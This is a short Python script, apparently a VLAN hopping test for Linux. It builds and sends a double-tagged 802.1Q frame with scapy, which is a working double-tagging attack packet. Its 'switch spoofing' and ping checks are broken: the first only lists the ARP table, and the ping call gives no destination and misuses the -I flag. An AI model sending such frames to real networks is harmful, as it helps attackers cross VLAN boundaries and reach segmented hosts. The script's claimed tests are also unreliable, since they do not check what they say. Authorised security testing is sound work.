import os
import subprocess

def vlan_hopping_test_linux(vlan_id1, vlan_id2):
    print("Running VLAN hopping test on Linux...")

    # Switch Spoofing Test
    print("Switch Spoofing Test:")
    subprocess.run(['arp', '-a'])

    # Double Tagging Test
    print(f"Double Tagging Test (VLAN {vlan_id1} -> VLAN {vlan_id2}):")
    subprocess.run(['ping', '-I', f'192.168.{vlan_id1}.1', '-c', '4'])

    # Example Exploitation (with permission)
    print("Exploitation Example:")
    from scapy.all import *
    pkt = Ether()/Dot1Q(vlan=vlan_id1)/Dot1Q(vlan=vlan_id2)/IP(dst=f"192.168.{vlan_id2}.1")/ICMP()
    sendp(pkt, iface="eth0")
    print("Exploitation packet sent")

if __name__ == "__main__":
    vlan_id1 = 10  # Replace with your VLAN ID 1
    vlan_id2 = 20  # Replace with your VLAN ID 2
    vlan_hopping_test_linux(vlan_id1, vlan_id2)

